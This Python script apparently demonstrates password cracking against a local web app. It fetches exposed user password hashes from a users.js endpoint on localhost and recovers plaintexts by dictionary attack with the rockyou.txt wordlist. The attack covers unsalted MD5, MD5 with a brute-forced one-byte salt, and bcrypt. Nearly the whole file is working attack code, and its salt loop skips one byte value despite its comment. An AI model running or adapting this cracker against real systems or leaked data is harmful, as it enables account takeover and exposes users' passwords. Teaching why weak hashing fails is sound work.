import bcrypt
import hashlib
import json
import requests
import time

target_url = "http://localhost:5000/users.js"
print("\nHashing algorithms to demonstrate password extraction with:\n1: md5 unsalted\n2: md5 salted\n3: bcrypt")
option = input("Enter option: ")
if option == '1':
    hash_type = "pwd_hash_md5_unsalted"
    hash_type_str = "md5 unsalted"
elif option == '2':
    hash_type = "pwd_hash_md5_salted"
    hash_type_str = "md5 salted"
else:
    option = '3'
    hash_type = "pwd_hash_bcrypt"
    hash_type_str = "bcrypt"

# format leaked data from response to a password hash list
# code adapted from: https://stackoverflow.com/questions/22367473/extract-javascript-information-from-url-with-python
exposedUserData_raw = requests.get(target_url + f"?pwd_choice={hash_type}")
exposedUserData_raw_str = exposedUserData_raw.text  # get text from response

# extract the list as a string so it can be jason-parsed
exposedUserData_str = exposedUserData_raw_str[exposedUserData_raw_str.find("["):exposedUserData_raw_str.find("]")+1]
exposedUserData = json.loads(exposedUserData_str)   # parse json & return a dict

exposed_hashes_set = {user["password"] if option != '3' else user["password"].encode() for user in exposedUserData}
print(f"\nHashing algorithm: {hash_type_str}")
print("\nExposed hashes:")
for hash_ in exposed_hashes_set:
    print(f"\t{hash_}" if option == '3' else f"\t'{hash_}'")

# read passwords from rockyou.txt & store them in rockyou_pwds
rockyou_file = "rockyou.txt"
pwd_file = open(rockyou_file, 'r', errors="ignore")
rockyou_pwds_raw = pwd_file.readlines()
pwd_file.close()

print("\nProcessing hashes. Please be patient... \n")

# remove trailing newline character & encode every rockyou password to set it up for hashing
rockyou_pwds = []
for raw_pwd in rockyou_pwds_raw:
    pwd_clean = raw_pwd.rstrip()  # remove trailing newline character
    pwd_to_bytes = pwd_clean.encode('utf-8')  # convert password to array of bytes
    rockyou_pwds.append(pwd_to_bytes)

if option == '1':
    # generate hash from passwords in rockyou.txt & compare against leaked hashes
    for pwd in rockyou_pwds:
        hash_md5_unsalted = hashlib.md5(pwd).hexdigest()   # generate hash
        if hash_md5_unsalted in exposed_hashes_set:
            print(f"\tSuccess! Matching hash found: '{hash_md5_unsalted}', Password: '{pwd.decode('utf-8')}'")
            exposed_hashes_set.remove(hash_md5_unsalted)
            if not exposed_hashes_set:
                break

elif option == '2':
    # generate a salt from all possible combinations in 1 byte
    for salt_int in range(255):   # 256 = 2^8
        salt = salt_int.to_bytes(1, "big")    # convert to byte
        print(f"Trying salt: {salt}")     # show encoded to trace progress

        # create hash from salt + rockyou passwords & compare
        for pwd in rockyou_pwds:
            hash_md5_salted = hashlib.md5(salt + pwd).hexdigest()  # generate hash
            if hash_md5_salted in exposed_hashes_set:
                print(f"\tSuccess! Hash cracked: '{hash_md5_salted}', Salt: {salt}, Password: '{pwd.decode('utf-8')}'")
                exposed_hashes_set.remove(hash_md5_salted)
                if not exposed_hashes_set:
                    break
        if not exposed_hashes_set:
            break
else:
    total_passwords = len(rockyou_pwds)
    # iterate over each exposed hash
    for exposed_hash in exposed_hashes_set:
        print(f"Trying hash: {exposed_hash}")  # show hash to trace progress

        # compare each rockyou password against exposed hash
        pwd_count = 0
        start_time = time.time()
        for pwd in rockyou_pwds:
            pwd_count += 1
            if pwd_count % 100 == 0:
                # show estimated completion time based on total avg
                elapsed_time = time.time() - start_time
                time_estimate_hrs = ((elapsed_time/pwd_count) * (total_passwords-pwd_count)) / 3600
                print(f"Passwords tried: {pwd_count}. Estimated time left (hrs) for this hash: {time_estimate_hrs:.2f}")
            hash_match = bcrypt.checkpw(pwd, exposed_hash)  # check match
            if hash_match:
                salt = exposed_hash[:29]
                print(f"\tSuccess! Hash cracked: {exposed_hash}, Salt: {salt}, Password: '{pwd.decode('utf-8')}'")
                break
